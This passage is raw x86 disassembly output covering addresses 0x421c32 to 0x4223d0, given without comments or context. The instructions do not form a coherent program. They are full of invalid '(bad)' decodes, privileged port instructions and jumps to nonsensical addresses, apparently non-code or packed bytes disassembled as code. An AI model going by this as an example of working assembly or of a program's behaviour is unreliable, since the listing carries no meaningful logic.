  421c32:	aaa    
  421c33:	push   edx
  421c34:	push   esi
  421c35:	add    ch,BYTE PTR [ebx]
  421c37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c38:	es mov esp,0xe50e7ed2
  421c3e:	cdq    
  421c3f:	jle    0x421cb4
  421c41:	and    DWORD PTR [ecx+eiz*4-0x2a],0x4a
  421c46:	xchg   edi,eax
  421c47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c48:	fnstenv [ecx+0x17]
  421c4b:	dec    edx
  421c4c:	push   cs
  421c4d:	(bad)  
  421c4e:	(bad)  
  421c4f:	add    edi,DWORD PTR [eax-0x36]
  421c52:	pop    esp
  421c53:	jbe    0x421cae
  421c55:	das    
  421c56:	pop    edx
  421c57:	inc    esp
  421c58:	arpl   WORD PTR ds:0x281dd5f6,dx
  421c5e:	mov    al,0x88
  421c60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c61:	inc    ebp
  421c62:	jge    0x421c2e
  421c64:	fsub   st,st(1)
  421c66:	jg     0x421bfb
  421c68:	int    0x13
  421c6a:	mov    ecx,0x91196067
  421c6f:	cdq    
  421c70:	sub    BYTE PTR [esi],bl
  421c72:	in     eax,0x37
  421c74:	clc    
  421c75:	div    BYTE PTR [edi+0x72e424c1]
  421c7b:	in     al,dx
  421c7c:	dec    edi
  421c7d:	icebp  
  421c7e:	mov    ecx,DWORD PTR [edx+0xf8f3b61]
  421c84:	jp     0x421c27
  421c86:	pop    ebx
  421c87:	inc    edi
  421c88:	out    0x88,eax
  421c8a:	jo     0x421c98
  421c8c:	or     ch,0xa7
  421c8f:	mov    ebx,0xfbb3c762
  421c94:	mov    al,ds:0x8f0c8315
  421c99:	pop    esi
  421c9a:	int3   
  421c9b:	xor    bl,BYTE PTR [eax+0x12]
  421c9e:	popf   
  421c9f:	adc    eax,0xc6c99463
  421ca5:	popf   
  421ca6:	pop    edx
  421ca7:	(bad)  
  421ca8:	jbe    0x421c78
  421caa:	sub    edx,DWORD PTR [esi+0x4bcb1529]
  421cb0:	sbb    BYTE PTR [ecx+0x32ec170c],bl
  421cb6:	sbb    dh,BYTE PTR [esi+eax*2+0x77]
  421cba:	inc    ebx
  421cbb:	add    DWORD PTR [ebp-0x70527ffa],eax
  421cc1:	leave  
  421cc2:	sbb    eax,0x1625a921
  421cc7:	inc    eax
  421cc8:	sahf   
  421cc9:	cld    
  421cca:	data16 sahf 
  421ccc:	push   esp
  421ccd:	mov    al,0x2f
  421ccf:	icebp  
  421cd0:	and    ah,al
  421cd2:	jbe    0x421d18
  421cd4:	xchg   esi,esp
  421cd6:	ja     0x421d22
  421cd8:	popf   
  421cd9:	mov    dl,0x3c
  421cdb:	loope  0x421d39
  421cdd:	adc    al,BYTE PTR [eax+0x54]
  421ce0:	mov    dl,0xf3
  421ce2:	imul   esi,DWORD PTR [ebp+0x10204ad2],0x6
  421ce9:	mov    fs,WORD PTR [ecx-0x5c]
  421cec:	in     al,0x7c
  421cee:	and    BYTE PTR [edx-0x422342b5],dh
  421cf4:	xor    esp,0x23
  421cf7:	jae    0x421cdb
  421cf9:	scas   al,BYTE PTR es:[edi]
  421cfa:	gs jo  0x421ca4
  421cfd:	pop    esp
  421cfe:	inc    ebp
  421cff:	sar    cl,cl
  421d01:	pop    eax
  421d02:	shl    DWORD PTR [edx-0x68746ed2],0x4e
  421d09:	push   0xffffffb2
  421d0b:	push   cs
  421d0c:	out    dx,eax
  421d0d:	mov    ds:0x69d43c1c,eax
  421d12:	cmc    
  421d13:	jns    0x421d51
  421d15:	fcom   DWORD PTR [ebx-0x6d48007b]
  421d1b:	xor    esi,DWORD PTR [edi-0x69c4885]
  421d21:	dec    esp
  421d22:	stc    
  421d23:	int3   
  421d24:	mov    eax,0x695ac7ca
  421d29:	sub    al,0x73
  421d2b:	aaa    
  421d2c:	cwde   
  421d2d:	jl     0x421d0d
  421d2f:	cdq    
  421d30:	fcmove st,st(3)
  421d32:	out    dx,al
  421d33:	and    DWORD PTR [ebx-0x4a],esi
  421d36:	leave  
  421d37:	icebp  
  421d38:	cwde   
  421d39:	adc    eax,DWORD PTR [edx+eax*8]
  421d3c:	and    eax,0xd146d02e
  421d41:	cmp    dh,al
  421d43:	adc    ecx,DWORD PTR [ebp-0x4baab666]
  421d49:	ret    
  421d4a:	shl    BYTE PTR [ebx-0x5f876ce1],cl
  421d50:	xor    ah,dl
  421d52:	mov    al,ds:0x82539165
  421d57:	adc    BYTE PTR [ebx-0x8],dh
  421d5a:	pop    edi
  421d5b:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  421d5d:	dec    edx
  421d5e:	or     al,0x51
  421d60:	popf   
  421d61:	adc    al,0x1
  421d63:	push   ecx
  421d64:	shl    BYTE PTR [edx+0x69d54870],cl
  421d6a:	stc    
  421d6b:	ret    
  421d6c:	addr16 push es
  421d6e:	(bad)  
  421d70:	cli    
  421d71:	sbb    BYTE PTR [esi-0x65],dh
  421d74:	jmp    0x421d75
  421d76:	(bad)  
  421d77:	in     al,dx
  421d78:	mov    ah,0x34
  421d7a:	or     al,0xfb
  421d7c:	adc    al,0x29
  421d7e:	data16 mov bh,0x44
  421d81:	shl    BYTE PTR [edx],0x86
  421d84:	imul   ecx,DWORD PTR [edx],0x6cfa523a
  421d8a:	xchg   ecx,eax
  421d8b:	adc    bl,ch
  421d8d:	inc    edx
  421d8e:	fld    QWORD PTR [ecx+0xf9724ab]
  421d94:	int    0x6e
  421d96:	aad    0x6e
  421d98:	jg     0x421e17
  421d9a:	xor    BYTE PTR [ebx],dh
  421d9c:	lds    edi,FWORD PTR [ecx+0x4bcd2fbb]
  421da2:	sub    ecx,edx
  421da4:	cmp    eax,eax
  421da6:	fnsave [eax+0xb]
  421da9:	xor    DWORD PTR [ecx-0x21c307de],ebp
  421daf:	test   DWORD PTR [ebx],eax
  421db1:	dec    ecx
  421db2:	pushf  
  421db3:	std    
  421db4:	jle    0x421d9c
  421db6:	fcmovne st,st(0)
  421db8:	push   0x5ee6b5d4
  421dbd:	mov    cl,BYTE PTR [ecx-0x33]
  421dc0:	jb     0x421dfe
  421dc2:	loopne 0x421e3d
  421dc4:	jg     0x421df1
  421dc6:	in     eax,dx
  421dc7:	test   eax,0xd3365e9d
  421dcc:	js     0x421d65
  421dce:	sbb    DWORD PTR [ebx+ecx*2],0x68654192
  421dd5:	addr16 jge 0x421e02
  421dd8:	dec    eax
  421dd9:	inc    ebp
  421dda:	int3   
  421ddb:	ret    0x8c7
  421dde:	test   BYTE PTR [ecx+0x4a51fd68],dh
  421de4:	sar    bh,cl
  421de6:	hlt    
  421de7:	repnz (bad) 
  421de9:	jmp    0x421e1a
  421deb:	push   es
  421dec:	in     al,dx
  421ded:	mov    BYTE PTR [eax-0x56],0xf0
  421df1:	and    ebx,DWORD PTR [ebx]
  421df3:	in     eax,dx
  421df4:	(bad)  
  421df5:	repnz test BYTE PTR [esi-0x35],0x57
  421dfa:	dec    ecx
  421dfb:	jle    0x421dec
  421dfd:	xchg   edi,eax
  421dfe:	cwde   
  421dff:	adc    DWORD PTR [edi],ebp
  421e01:	out    0x91,al
  421e03:	push   0x60
  421e05:	dec    esi
  421e06:	div    DWORD PTR [edx]
  421e08:	mov    gs,WORD PTR [ecx]
  421e0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e0b:	mov    ecx,0x7eb1b9c6
  421e10:	out    dx,al
  421e11:	lea    ebx,[eax+eiz*8-0x69aef910]
  421e18:	dec    edx
  421e19:	xchg   esp,eax
  421e1a:	sbb    ah,BYTE PTR [ebx+ebx*8+0x1aea156a]
  421e21:	test   DWORD PTR [ebp*4+0x62b415c9],ebp
  421e28:	loop   0x421ddc
  421e2a:	inc    edx
  421e2b:	jne    0x421e8c
  421e2d:	loop   0x421e11
  421e2f:	and    DWORD PTR [eax],esi
  421e31:	into   
  421e32:	jge    0x421dfe
  421e34:	(bad)  
  421e35:	cmp    ebp,DWORD PTR [edx-0x61]
  421e38:	add    cl,BYTE PTR [ebp+0x593dbb05]
  421e3e:	and    ebp,ebx
  421e40:	icebp  
  421e41:	bound  esp,QWORD PTR [esi]
  421e43:	arpl   bp,dx
  421e45:	mov    eax,0xeeeb3c8a
  421e4a:	xlat   BYTE PTR cs:[ebx]
  421e4c:	cmp    ah,bh
  421e4e:	mov    esp,0xe04b269a
  421e53:	xor    bl,al
  421e55:	mov    dh,0x4
  421e57:	cmp    ebx,ebp
  421e59:	xchg   esp,eax
  421e5a:	xor    bh,ch
  421e5c:	pop    esp
  421e5d:	iret   
  421e5e:	or     DWORD PTR [esi+0x35edc3b1],esi
  421e64:	mov    edx,0xcd78e347
  421e69:	adc    eax,0x745f0a57
  421e6e:	jge    0x421e9c
  421e70:	out    0x18,al
  421e72:	adc    DWORD PTR [ecx],0xffffffc3
  421e75:	mov    ah,0x84
  421e77:	not    DWORD PTR [eax]
  421e79:	pop    ss
  421e7a:	mov    esp,0x694d2dd7
  421e7f:	pop    eax
  421e80:	loope  0x421e31
  421e82:	scas   al,BYTE PTR es:[edi]
  421e83:	jnp    0x421e4d
  421e85:	call   0x6db4:0xf1bad7c9
  421e8c:	xchg   edi,eax
  421e8d:	dec    esp
  421e8e:	xchg   BYTE PTR [ebx+0x1e76adf7],bh
  421e94:	push   ecx
  421e95:	xchg   edi,eax
  421e96:	retf   0x38b8
  421e99:	add    BYTE PTR [ecx+0x111757de],ch
  421e9f:	mov    esi,0x6748b57
  421ea4:	popa   
  421ea5:	jbe    0x421ecb
  421ea7:	fwait
  421ea8:	jl     0x421eb7
  421eaa:	(bad)  
  421eab:	fisub  WORD PTR [ecx-0x26]
  421eae:	lods   eax,DWORD PTR ds:[esi]
  421eaf:	repz xor BYTE PTR [edi+0x34],bl
  421eb3:	lds    esp,FWORD PTR [ebp+0x50]
  421eb6:	std    
  421eb7:	sub    al,0x63
  421eb9:	gs hlt 
  421ebb:	lods   al,BYTE PTR ds:[esi]
  421ebc:	aas    
  421ebd:	lods   al,BYTE PTR ds:[esi]
  421ebe:	mov    bl,BYTE PTR [ecx+0x9]
  421ec1:	and    BYTE PTR [ebx-0x14],dh
  421ec4:	call   0xe0a90ae4
  421ec9:	in     eax,0x39
  421ecb:	dec    eax
  421ecc:	aad    0x9f
  421ece:	retf   
  421ecf:	js     0x421ee6
  421ed1:	ins    BYTE PTR es:[edi],dx
  421ed2:	imul   edx,DWORD PTR [ebx],0xffffffb0
  421ed5:	iret   
  421ed6:	aad    0x42
  421ed8:	(bad)  
  421ed9:	clc    
  421eda:	(bad)  
  421edb:	aad    0x75
  421edd:	jo     0x421ecc
  421edf:	dec    esi
  421ee0:	add    bl,BYTE PTR [esi+edx*4]
  421ee3:	fldl2e 
  421ee5:	mov    al,0xba
  421ee7:	bound  esi,QWORD PTR [eax-0x1f]
  421eea:	mov    bh,0x17
  421eec:	shr    DWORD PTR [eax-0x35],cl
  421eef:	dec    eax
  421ef0:	and    BYTE PTR [edx-0x5c9fbebb],ah
  421ef6:	lock xchg BYTE PTR [ecx],cl
  421ef9:	in     eax,0xc7
  421efb:	sub    esi,DWORD PTR [esi+edi*4+0x530b10fe]
  421f02:	pop    ds
  421f03:	fldenv [eax]
  421f05:	in     eax,0xb1
  421f07:	pusha  
  421f08:	mov    dh,0xda
  421f0a:	sti    
  421f0b:	cmp    BYTE PTR [edx],bl
  421f0d:	loope  0x421f55
  421f0f:	xor    edi,DWORD PTR [eax]
  421f11:	jb     0x421ee5
  421f13:	cmp    eax,0x4238c69a
  421f18:	xor    eax,0xcc2371ef
  421f1d:	out    dx,eax
  421f1e:	fcom   QWORD PTR [ecx-0x397a55ea]
  421f24:	hlt    
  421f25:	popa   
  421f26:	jne    0x421ee7
  421f28:	psubsw mm1,QWORD PTR [ebx]
  421f2b:	retf   
  421f2c:	mov    bl,0x7d
  421f2e:	and    DWORD PTR [ebx+0x58],eax
  421f31:	(bad)  
  421f32:	jl     0x421ef9
  421f34:	lahf   
  421f35:	xchg   BYTE PTR [ebx],dl
  421f37:	xchg   ebx,eax
  421f38:	prefetch (bad)
  421f39:	or     eax,0x718eae4
  421f3e:	adc    BYTE PTR [edx],bl
  421f40:	inc    eax
  421f41:	bound  edx,QWORD PTR [ebx+eax*4]
  421f44:	add    BYTE PTR [edx],bh
  421f46:	jno    0x421fa7
  421f48:	mov    cl,BYTE PTR [esi]
  421f4a:	aaa    
  421f4b:	and    eax,0x8083da7b
  421f50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f51:	popa   
  421f52:	in     al,0xf1
  421f54:	inc    ecx
  421f55:	jle    0x421fcf
  421f57:	jle    0x421f0d
  421f59:	add    bl,bl
  421f5b:	xchg   esp,eax
  421f5c:	(bad)  
  421f5d:	sbb    eax,DWORD PTR [ebx-0x63bb58a4]
  421f63:	aam    0xc3
  421f65:	adc    cl,BYTE PTR [esp+ecx*1]
  421f68:	adc    al,0x59
  421f6a:	pusha  
  421f6b:	fimul  DWORD PTR [edx-0x51]
  421f6e:	mov    ecx,0x70737c9b
  421f73:	pop    ecx
  421f74:	xchg   ecx,eax
  421f75:	dec    esi
  421f76:	outs   dx,DWORD PTR ds:[esi]
  421f77:	and    BYTE PTR [eax-0x65],al
  421f7a:	jmp    0xdb65c649
  421f7f:	ja     0x421f68
  421f81:	out    dx,eax
  421f82:	and    al,0xda
  421f84:	retf   0xf58a
  421f87:	mov    al,ds:0x214de09a
  421f8c:	inc    eax
  421f8d:	push   es
  421f8e:	jg     0x421fe4
  421f90:	sbb    esp,DWORD PTR [ecx]
  421f92:	mov    edx,0x9d55c4b6
  421f97:	mov    ch,0x13
  421f99:	pop    esi
  421f9a:	push   ecx
  421f9b:	mov    eax,ds:0x6736d54
  421fa0:	(bad)
  421fa3:	sbb    BYTE PTR [ebx-0x25],0xee
  421fa7:	aaa    
  421fa8:	out    0x7a,eax
  421faa:	add    dh,bl
  421fac:	fild   QWORD PTR [eax+ebx*4+0x735922c3]
  421fb3:	xchg   DWORD PTR [esi+edx*1+0x7c],ecx
  421fb7:	add    edi,ebx
  421fb9:	inc    ebx
  421fba:	and    bh,bh
  421fbc:	es mov ss,ecx
  421fbf:	aas    
  421fc0:	sub    BYTE PTR [edi-0x1c],ah
  421fc3:	jmp    0xf8b9a591
  421fc8:	pop    eax
  421fc9:	and    eax,0x1af6e882
  421fce:	xchg   DWORD PTR [ebx-0xd],ebx
  421fd1:	in     eax,0xb8
  421fd3:	fs iret 
  421fd5:	inc    esi
  421fd6:	test   eax,0xd2592bd9
  421fdb:	inc    edi
  421fdc:	dec    ebx
  421fdd:	hlt    
  421fde:	(bad)  
  421fdf:	mov    eax,ds:0x1221f5a6
  421fe4:	jmp    0xfb3c77a4
  421fe9:	sub    BYTE PTR ds:0xd8888c91,dh
  421fef:	or     DWORD PTR [ebx],0xb3c5fa4c
  421ff5:	in     eax,0x65
  421ff7:	cmp    ecx,DWORD PTR [ecx-0x3f]
  421ffa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ffb:	rcl    BYTE PTR [eax],0xc6
  421ffe:	lds    edi,FWORD PTR [eax]
  422000:	rcl    edi,1
  422002:	inc    esi
  422003:	jne    0x42207a
  422005:	scas   al,BYTE PTR es:[edi]
  422006:	iret   
  422007:	jno    0x421feb
  422009:	stc    
  42200a:	mov    eax,ds:0x683762a8
  42200f:	addr16 daa 
  422011:	pop    es
  422012:	in     al,dx
  422013:	xor    BYTE PTR [ecx-0x592d1565],bh
  422019:	jnp    0x421ff8
  42201b:	or     ecx,DWORD PTR [eax+0x5b]
  42201e:	iret   
  42201f:	jmp    0x422022
  422021:	mov    WORD PTR [ebx+0x3c4d9252],ds
  422027:	clc    
  422028:	scas   al,BYTE PTR es:[edi]
  422029:	aas    
  42202a:	jl     0x422057
  42202c:	push   ds
  42202d:	xor    eax,0x21f8aee3
  422032:	sub    eax,0x5f95d7a7
  422037:	push   0xc3c1df92
  42203c:	ins    BYTE PTR es:[edi],dx
  42203d:	imul   BYTE PTR ds:0xd044ff8
  422043:	xor    cl,BYTE PTR [eax]
  422045:	cmc    
  422046:	fdiv   QWORD PTR [ecx-0x372cc673]
  42204c:	mul    DWORD PTR [ebp+0x31]
  42204f:	xchg   esp,eax
  422050:	xchg   ebx,eax
  422051:	cdq    
  422052:	mov    cl,0x54
  422054:	cmp    al,0xdd
  422056:	jge    0x422080
  422058:	push   ecx
  422059:	mov    bl,cl
  42205b:	addr16 es mov esi,0xf79bb066
  422062:	mov    ebx,0x3df64738
  422067:	lock fdivr QWORD PTR [edx+0x66997148]
  42206e:	add    eax,0x4bc69d06
  422073:	dec    ebp
  422074:	dec    edx
  422075:	aad    0xe2
  422077:	int    0x99
  422079:	loope  0x422038
  42207b:	jno    0x4220ed
  42207d:	addr16 mov ecx,0xad61e929
  422083:	pop    esi
  422084:	mov    cl,0xbf
  422086:	sub    BYTE PTR [edi+ecx*2],0x3
  42208a:	or     eax,DWORD PTR [ebx+ecx*2]
  42208d:	(bad)  
  42208e:	fstp   QWORD PTR [ebp+0x2da19da4]
  422094:	fs push ecx
  422096:	test   al,0xf0
  422098:	xor    esp,ebx
  42209a:	add    ecx,DWORD PTR [edi+0x44513679]
  4220a0:	into   
  4220a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220a2:	mov    edi,0xa4c0b298
  4220a7:	add    dl,0xb4
  4220aa:	xor    al,0x52
  4220ac:	mov    bl,BYTE PTR ds:0xbb12f46
  4220b2:	(bad)  
  4220b3:	out    dx,eax
  4220b4:	jne    0x422071
  4220b6:	adc    eax,0x31db83ad
  4220bb:	sub    DWORD PTR [edi+0x2dcd605a],ebx
  4220c1:	aad    0xaa
  4220c3:	cwde   
  4220c4:	push   eax
  4220c5:	test   al,0x10
  4220c7:	test   BYTE PTR [esi+eax*1],ah
  4220ca:	int    0x28
  4220cc:	pop    es
  4220cd:	stos   DWORD PTR es:[edi],eax
  4220ce:	cmc    
  4220cf:	pop    ecx
  4220d0:	sbb    al,0xc1
  4220d2:	fiadd  WORD PTR [edi-0x20d86cd9]
  4220d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220d9:	retf   
  4220da:	xor    al,BYTE PTR [esi]
  4220dc:	(bad)  
  4220dd:	mov    gs,WORD PTR [ebx+0x4a]
  4220e0:	retf   
  4220e1:	and    ch,BYTE PTR [ecx+0x2e7f4621]
  4220e7:	push   ss
  4220e8:	xchg   esp,eax
  4220e9:	jne    0xc652dc7b
  4220ef:	add    eax,0xcf109a6e
  4220f4:	es aas 
  4220f6:	lock dec esp
  4220f8:	pop    ecx
  4220f9:	test   al,0xc4
  4220fb:	mov    ebx,0x96e30e9d
  422100:	mov    al,ds:0x3e1bd534
  422105:	xor    BYTE PTR [edi+0x6d],dl
  422108:	in     eax,0x9c
  42210a:	bound  eax,QWORD PTR [ecx-0x18693b34]
  422110:	out    dx,al
  422111:	mov    edi,DWORD PTR [esi]
  422113:	nop
  422114:	aas    
  422115:	jecxz  0x422156
  422117:	add    ch,BYTE PTR [esi]
  422119:	icebp  
  42211a:	outs   dx,BYTE PTR ds:[esi]
  42211b:	aaa    
  42211c:	cmp    edx,ecx
  42211e:	test   DWORD PTR ds:0x3df3b0b4,esi
  422124:	and    eax,0x71fc1767
  422129:	or     edi,DWORD PTR [edi+esi*4-0x2a904d78]
  422130:	jne    0x422187
  422132:	push   0x14fed7da
  422137:	leave  
  422138:	pop    esi
  422139:	out    dx,al
  42213a:	call   0x50fd7c9
  42213f:	addr16 gs dec edi
  422142:	push   esi
  422143:	inc    edi
  422144:	push   ebp
  422145:	jne    0x42219f
  422147:	push   es
  422148:	call   0x26de9e94
  42214d:	std    
  42214e:	sahf   
  42214f:	mov    BYTE PTR [ecx-0x3a713a2d],0x89
  422156:	mov    bh,0xb1
  422158:	rol    ch,1
  42215a:	push   ebp
  42215b:	cdq    
  42215c:	or     BYTE PTR [ebx-0x29cd2c7f],ch
  422162:	pop    edx
  422163:	(bad)  
  422164:	pop    eax
  422165:	iret   
  422166:	dec    ebx
  422167:	jnp    0x422122
  422169:	aas    
  42216a:	jle    0x4220fa
  42216c:	cs in  al,0x3e
  42216f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422170:	xor    DWORD PTR [eax],ebp
  422172:	jnp    0x422112
  422174:	add    eax,DWORD PTR [edi-0x40]
  422177:	push   ss
  422178:	scas   eax,DWORD PTR es:[edi]
  422179:	and    eax,0x5e9fb8de
  42217e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42217f:	test   DWORD PTR [eax-0x38],esp
  422182:	jae    0x4221b1
  422184:	mov    ch,0x75
  422186:	dec    esi
  422187:	mov    dh,0x0
  422189:	outs   dx,BYTE PTR ds:[esi]
  42218a:	fidivr WORD PTR [ecx+edi*4-0x13]
  42218e:	neg    BYTE PTR [eax-0x2b4d6fa6]
  422194:	inc    edi
  422195:	or     eax,0x35d4a1b2
  42219a:	stos   BYTE PTR es:[edi],al
  42219b:	pop    ebp
  42219c:	sub    eax,0xfadda93b
  4221a1:	jb     0x422167
  4221a3:	ret    0x248a
  4221a6:	xor    al,0xc3
  4221a8:	outs   dx,DWORD PTR ds:[esi]
  4221a9:	add    al,0x2c
  4221ab:	xchg   esi,eax
  4221ac:	cmp    di,bp
  4221af:	into   
  4221b0:	retf   0xcb13
  4221b3:	loop   0x422186
  4221b5:	adc    al,0x80
  4221b7:	xor    BYTE PTR [edi+0x7d],dl
  4221ba:	scas   al,BYTE PTR es:[edi]
  4221bb:	fwait
  4221bc:	pop    ebx
  4221bd:	outs   dx,BYTE PTR ds:[esi]
  4221be:	mov    esp,0x70e5bc38
  4221c3:	xor    BYTE PTR [ebx+ebp*1],dl
  4221c6:	xor    al,0x5d
  4221c8:	(bad)  
  4221c9:	sbb    ecx,ecx
  4221cb:	out    0x9b,eax
  4221cd:	inc    ecx
  4221ce:	inc    edx
  4221cf:	or     al,BYTE PTR [esi]
  4221d1:	icebp  
  4221d2:	in     eax,dx
  4221d3:	adc    esp,DWORD PTR [esp+esi*2+0x1e4e47e8]
  4221da:	test   eax,0x970f6f04
  4221df:	setl   BYTE PTR [ebx-0x7e]
  4221e3:	add    al,0x46
  4221e5:	in     al,dx
  4221e6:	mov    ch,0xe
  4221e8:	and    al,0x87
  4221ea:	int    0xc3
  4221ec:	sbb    BYTE PTR [esi+0x64abb506],0xcf
  4221f3:	(bad)  
  4221f4:	push   es
  4221f5:	mov    bl,0xd2
  4221f7:	mov    ?,eax
  4221f9:	or     ah,BYTE PTR [edx+ecx*8-0x36646d6f]
  422200:	pop    es
  422201:	mov    ebx,ebx
  422203:	mov    al,0xbd
  422205:	push   0x71
  422207:	cs js  0x42221f
  42220a:	inc    esi
  42220b:	mov    dh,0x99
  42220d:	push   ss
  42220e:	lods   al,BYTE PTR ds:[esi]
  42220f:	sub    eax,0xf7055fcb
  422214:	jle    0x4221f3
  422216:	mov    dl,0xc0
  422218:	fcmovbe st,st(2)
  42221a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42221b:	push   esi
  42221c:	sti    
  42221d:	dec    ebx
  42221e:	ror    BYTE PTR [ebx-0x61],0x7
  422222:	shr    BYTE PTR [ecx+0x65126b59],cl
  422228:	popf   
  422229:	and    al,0x54
  42222b:	test   al,0x9d
  42222d:	or     al,0x90
  42222f:	aad    0x65
  422231:	pusha  
  422232:	inc    eax
  422233:	call   0x49b3:0xbfb70349
  42223a:	add    eax,0xaf5cef03
  42223f:	jns    0x4221e7
  422241:	adc    DWORD PTR [edi],ecx
  422243:	loop   0x4221d3
  422245:	mov    ch,0x30
  422247:	push   ebp
  422248:	jecxz  0x422221
  42224a:	mov    eax,DWORD PTR [ecx+0x66]
  42224d:	test   DWORD PTR [ebp-0x9],edi
  422250:	and    bl,BYTE PTR [eax+0x119fc2e7]
  422256:	shl    DWORD PTR [edi+0x7f8ee655],0xf0
  42225d:	adc    DWORD PTR [esi-0x40b9a536],ecx
  422263:	div    ch
  422265:	mov    ah,0x3
  422267:	add    DWORD PTR [ebp-0x70b8c502],esi
  42226d:	outs   dx,DWORD PTR ds:[esi]
  42226e:	push   esp
  42226f:	jle    0x4222dc
  422271:	or     edi,DWORD PTR [ecx-0x5093df04]
  422277:	mov    WORD PTR [ecx+0x6ae7c98],fs
  42227d:	sahf   
  42227e:	jne    0x4222c3
  422280:	int3   
  422281:	aaa    
  422282:	outs   dx,DWORD PTR ds:[esi]
  422283:	es xor dh,dh
  422286:	inc    ecx
  422287:	mov    al,ds:0xb6e9f05a
  42228c:	pusha  
  42228d:	mov    esi,0x4d5ff866
  422292:	or     DWORD PTR ds:[edi-0x43],ebx
  422296:	ror    BYTE PTR [eax+0x56],0x74
  42229a:	push   0x18ba86fd
  42229f:	lea    eax,[edx*4-0x38692d34]
  4222a6:	sub    ebp,ebx
  4222a8:	hlt    
  4222a9:	or     al,0x2d
  4222ab:	xchg   ebx,eax
  4222ac:	or     ch,BYTE PTR [ecx+0x172b863c]
  4222b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222b3:	mov    eax,0x34261d3f
  4222b8:	and    DWORD PTR [eax],edx
  4222ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222bb:	xchg   ebx,eax
  4222bc:	xor    ecx,DWORD PTR [esi+0x300203db]
  4222c2:	xor    al,0xad
  4222c4:	aad    0x9c
  4222c6:	retf   0xb77e
  4222c9:	dec    esi
  4222ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222cb:	cld    
  4222cc:	mov    ds:0x589ea577,al
  4222d1:	mov    ch,0x99
  4222d3:	shl    ch,1
  4222d5:	xor    eax,0x295a894c
  4222da:	cs ins DWORD PTR es:[edi],dx
  4222dc:	rcr    DWORD PTR [ecx-0x662edc70],cl
  4222e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222e3:	das    
  4222e4:	lock pop edi
  4222e6:	adc    BYTE PTR [ebx+eiz*4],dh
  4222e9:	in     eax,dx
  4222ea:	xchg   ebx,eax
  4222eb:	xor    al,0x66
  4222ed:	mov    ch,0x77
  4222ef:	das    
  4222f0:	ror    DWORD PTR [edx],0xa2
  4222f3:	jbe    0x4222be
  4222f5:	push   ebp
  4222f6:	inc    esp
  4222f7:	sar    BYTE PTR [edi+ecx*8+0x6418cdfc],cl
  4222fe:	xor    ebp,edx
  422300:	mov    ah,0x80
  422302:	retf   
  422303:	cwde   
  422304:	pop    ss
  422305:	pusha  
  422306:	aam    0xfe
  422308:	xchg   ecx,eax
  422309:	les    esi,FWORD PTR [ebx-0x6a]
  42230c:	idiv   BYTE PTR [ebx]
  42230e:	test   DWORD PTR [edx+esi*2-0x2bba3c70],ebp
  422315:	aaa    
  422316:	jnp    0x42236b
  422318:	shl    BYTE PTR [edx],cl
  42231a:	pop    ecx
  42231b:	call   0x948ecd2b
  422320:	fstp   DWORD PTR [ebx-0x4fd07a05]
  422326:	sbb    al,0x5e
  422328:	dec    esp
  422329:	ror    BYTE PTR [esi+0x6a],1
  42232c:	gs mov ebp,0xcde7b4f9
  422332:	lahf   
  422333:	dec    edx
  422334:	popa   
  422335:	adc    BYTE PTR [ebx-0x75],bl
  422338:	div    dh
  42233a:	ins    DWORD PTR es:[edi],dx
  42233b:	outs   dx,DWORD PTR ds:[esi]
  42233c:	sub    bh,BYTE PTR [esi]
  42233e:	(bad)  
  42233f:	arpl   WORD PTR [eax-0x13],dx
  422342:	dec    esp
  422343:	add    edx,DWORD PTR [ecx+0x517183bb]
  422349:	and    cl,BYTE PTR [esi]
  42234b:	fnstenv [edx+0x26]
  42234e:	into   
  42234f:	xor    eax,0xab648f71
  422354:	and    al,0x70
  422356:	js     0x422375
  422358:	fisubr DWORD PTR [edx-0x6a]
  42235b:	cdq    
  42235c:	aaa    
  42235d:	fimul  WORD PTR [edi]
  42235f:	xchg   ecx,eax
  422360:	test   eax,0x84e4c1c2
  422365:	outs   dx,BYTE PTR ds:[esi]
  422366:	sbb    ch,BYTE PTR [ecx+0x651dd235]
  42236c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42236d:	mov    edi,0x2130833b
  422372:	jb     0x422321
  422374:	xor    al,0x49
  422376:	fsubr  DWORD PTR [esi+ebx*1+0x371dfec3]
  42237d:	repnz mov edx,DWORD PTR [edx+eiz*2+0x28000501]
  422385:	or     DWORD PTR [edx+0x6e3535e2],eax
  42238b:	out    dx,eax
  42238c:	nop
  42238d:	jne    0x422312
  42238f:	jmp    0xa8b5d89c
  422394:	jo     0x422413
  422396:	in     al,dx
  422397:	out    0xad,eax
  422399:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42239a:	push   0x2b
  42239c:	mov    edi,0x6a7d4b00
  4223a1:	push   0xffffffeb
  4223a3:	popa   
  4223a4:	push   0xffffffb9
  4223a6:	mov    bh,BYTE PTR [esi-0x7332655c]
  4223ac:	pop    edx
  4223ad:	inc    eax
  4223ae:	out    0x27,eax
  4223b0:	xor    esi,eax
  4223b2:	ds dec ecx
  4223b4:	fdivr  DWORD PTR [ecx]
  4223b6:	inc    ebx
  4223b7:	loop   0x42240a
  4223b9:	mov    bh,0x49
  4223bb:	sub    BYTE PTR [esi+0x7d],al
  4223be:	cmp    DWORD PTR [ecx+eax*4+0x59],eax
  4223c2:	dec    ecx
  4223c3:	(bad)  
  4223c5:	rol    BYTE PTR [ecx+0x1d],cl
  4223c8:	scas   al,BYTE PTR es:[edi]
  4223c9:	aaa    
  4223ca:	sub    dh,BYTE PTR ds:0x1b3f0faa
  4223d0:	mov    WORD PTR [edi-0x18f2ca2],ds
